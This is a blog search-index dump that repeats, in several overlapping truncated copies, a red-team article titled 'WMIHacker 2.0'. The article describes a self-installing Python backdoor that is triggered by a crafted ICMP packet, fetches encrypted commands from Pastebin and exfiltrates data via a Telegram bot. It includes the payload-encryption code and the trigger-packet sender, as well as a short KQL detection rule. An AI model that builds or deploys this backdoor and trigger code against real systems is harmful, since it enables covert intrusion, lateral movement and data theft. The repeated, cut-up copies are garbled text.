a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\nvictim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\nresult = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\nresult = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Paste\nvictim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\nresult = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nvictim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend 